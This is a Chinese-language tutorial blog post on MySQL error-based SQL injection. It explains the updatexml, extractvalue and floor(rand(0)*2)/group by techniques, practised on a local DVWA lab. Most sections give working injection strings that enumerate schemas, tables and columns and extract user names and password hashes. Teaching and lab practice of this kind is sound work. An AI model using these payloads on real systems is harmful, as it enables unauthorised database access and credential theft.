
[参考文章](https://www.cnblogs.com/c1047509362/p/12806297.html)
`0x7e` 是 `~` 号的 ASCII 码，为了方便阅读。
# 知识铺垫

在上一篇中我们在漏洞页面中进行了SQL注入实战之联合查询，这篇文章带来的是SQL注入之报错注入篇。

首先我们来细分一下SQL注入分类  
  
  
SQL注入分类：

- 回显正常---> 联合查询  union select
- 回显报错---> Duplicate entry()  
                         extractvalue()  
    　　              updatexml()
- 盲注        --->布尔型盲注  
                          基于时间的盲注sleep()  
      
    

在探讨SQL注入之报错注入之前，有一个前提就是页面能够响应详细的错误描述，然而mysql数据库中显示错误描述是因为开发程序中采用了print_r  mysql_error()函数，将mysql错误信息输出。

还有就是一起默写一下SQL注入的核心语句吧，巩固记忆的同时，方便后续注入的使用~
``` sql
information_schema

schemata(schema_name)

tables(table_schema,table_name)

columns(table_schema,table_name,column_name)

select schema_name from information_schema.schemata;

select table_name from information_schema.tables where table_schema='dvwa';

select column_name from information_schema.columns where table_name='users' and table_schema='dvwa';

select concat(username,password) from dvwa.users;

```

#   xpath报错注入（extractvalue和updatexml）

## 一、知识铺垫（请认真研读）  
  

- 在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：  
      
    `updatexml（）`  
      
    `extractvalue（）`  
      
    当这两个函数在执行时，如果出现xml文档路径错误就会产生报错  
      
    
- **`updatexml（）` 函数**  
    
    - ` updatexml（）` 是一个使用不同的xml标记匹配和替换xml块的函数。
        
    - 作用：改变文档中符合条件的节点的值
        
    - 语法： `updatexml（XML_document，XPath_string，new_value）` 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据
        
    - updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）
        
    - 例如：` select * from test where id = 1 and (updatexml(1,0x7e,3));` 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。
          
    
- **extractvalue（）函数 ** 
    - 此函数从目标XML中返回包含所查询值的字符串语法：`extractvalue（XML_document，xpath_string）` 第一个参数：string格式，为XML文档对象的名称第二个参数：xpath_string（xpath格式的字符串）` select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));`
        
    - extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）
        
    - `select user,password from users where user_id=1 and (extractvalue(1,0x7e));`
        
    - 由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。
        
    

**二、updatexml（）报错注入实战（基于dvwa平台）**

**前景提示：本人在虚拟机中搭建好了dvwa平台，在本机中完成SQL注入实战,加载dvwa直接进入SQL注入模块，我这里的等级为low。**

**我将自己构造的payload语句进行加粗显示，剩下的都是固定格式。**

**开始注入**

**爆出数据库及相关信息**   `dvwa` 是此处的表名
``` sql
1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#
```

![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200429233616379-1261655072.png)

 **爆当前数据库表信息**

``` sql
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #
```

![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200429234057249-1633845343.png)

 注：此处使用group_concat（）函数进行输出，否则会出现错误。如下图所示。

![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200429234312742-1503331986.png)

 **爆user表字段信息**

``` sql
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'),0x7e),1) #
```

![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200429234726269-238529993.png)

**爆数据库内容**

``` sql
1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #
```

![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200429235113216-37097958.png)

  
**三、extractvalue（）报错注入实战（基于dvwa平台）**  
extractvalue()函数其实与updatexml()函数大同小异，都是通过xpath路径错误报错，而本人的示例中皆为利用0x7e（~）,其不属于xpath语法格式，因此报出xpath语法错误。

``` sql
1' and extractvalue(1,concat(0x7e,user(),0x7e,database())) #
```

![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200429235938759-455642046.png)

  
``` sql
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #
```

![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200429235922501-214326211.png)

  
``` sql
1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) #
```

![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430000046889-1274165057.png)

```sql
1' and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #
```

![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430000313070-1154562360.png)

# floor（）函数报错注入

## 一、概述

原理：利用select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。

## 二、函数理解

附带一下本次解释函数的表创建步骤（不再附图）以及数据的填充。

``` sql
create database test1;  
use test1；  
  
create table czs(id int unsigned not null primary key auto_increment, name varchar(15) not null);

insert into czs(id,name) values(1,'chenzishuo');  
insert into czs(id,name) values(2,'zhangsan');  
insert into czs(id,name) values(3,'lisi');  
insert into czs(id,name) values(4,'wangwu');
```

- rand()函数  
    rand()可以产生一个在0和1之间的随机数  
    ![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430005059708-33223068.png)
    
     ![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430005241001-300121404.png)
    
     可以看出，直接使用rand函数每次产生的数值不一样，但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机。  
      
    ![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430005415464-2095664437.png)
    
      
      
    
- floor (rand(0)*2)函数  
    floor函数的作用就是返回小于等于括号内该值的最大整数。  
    rand()本身是返回0~1的随机数，但在后面*2就变成了返回0~2之间的随机数。  
    配合上floor函数就可以产生确定的两个数，即0和1。  
    并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。  
    此处的myclass 表为含有四行数据的表。  
    结合上述的函数，每次产生的随机数列都是 0 1 1 0  
    ![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430013827951-1006107102.png)
    
- group by 函数  
    group by 函数，作用就是分类汇总。  
    等一下再说group by，我们首先看一下我的表。  
      
    ![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430012542717-1963790432.png)
    
     再在id 和 name后分别放入a x，意思就是id显示为a name显示为x。  
    ![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430012635961-442188620.png)
    
     然后使用group by 函数进行分组，并且按照x（name）进行排序。
    
      
    ![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430012724023-1306553509.png)
    
     友情提示：在使用group by 函数进行分类时，会因为mysql版本问题而产生问题，主要是启用了ONLY_FULL_GROUP_BY SQL模式（默认情况下），MySQL将拒绝选择列表，HAVING条件或ORDER BY列表的查询引用在GROUP BY子句中既未命名的非集合列，也不在功能上依赖于它们。（或者自行百度解决）  
    https://blog.csdn.net/weixin_41991232/article/details/82803170
    
- count（*）函数  
    count（*）函数作用为统计结果的记录数。  
    ![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430013417572-1110471802.png)
    
     这就是对重复的数据进行整合计数，x就是每个name的数量，我这里每个只有一个当然count（*）都为1了。
    
- ******综合使用产生报错  
    select count(*),floor(rand(0)*2) x from czs group by x;  
    当count（*）和group by x同时执行时，就会爆出duplicate entry错误。  
    ******
    
     ![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430013942466-1964589845.png)
    
     根据前面的函数，这句话是统计后面的floor（rand（0）*2）from czs产生的随机数种类并计算数量，0110，应该是两个两个，但是最后却报错了。  
      
    **报错原因解析 **
    
    >通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。group by 语句报错的原因
    >是 floor(random(0)*2)的不确定性，即可能为 0 也可能为 1
    >group by key 执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，
    >如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果
    >该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（插入数据时，会再计算rand 值）
    >如果此时临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为 1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值    实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行时是不报错的。
    

## 三、实战注入（基于dvwa平台）

①判断是否存在报错注入  
id=1' union select count(*),floor(rand(0)*2) x from information_schema.schemata group by x#  
![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430015303474-438854402.png)

 可以看出存在报错注入  
②爆出当前数据库名

id=1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #  
dvwa前的1 是哪个随机数，不要大惊小怪哦~  
![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430015425029-1331896801.png)

  
③爆出表

id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema='dvwa' limit 0,1)) x from information_schema.schemata group by x#  
![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430015652740-564601583.png)

  
id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema='dvwa' limit 1,1)) x from information_schema.schemata group by x#  
![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430015713572-489769446.png)

  
④爆出字段名

id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name='users' and table_schema='dvwa' limit 0,1)) x from information_schema.schemata group by x#  
![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430015816712-2117100789.png)

 改变limit限定数值，可以得出当前的字段 user_id first_name user password

  
⑤爆出user和password

id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(user,0x3a,password) from dvwa.users limit 0,1)) x from information_schema.schemata group by x#  
![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430015935310-1485761129.png)

再解码可得 admin-password  
![](https://img2020.cnblogs.com/blog/1838324/202004/1838324-20200430020007244-546859095.png)

 大功告成！~~！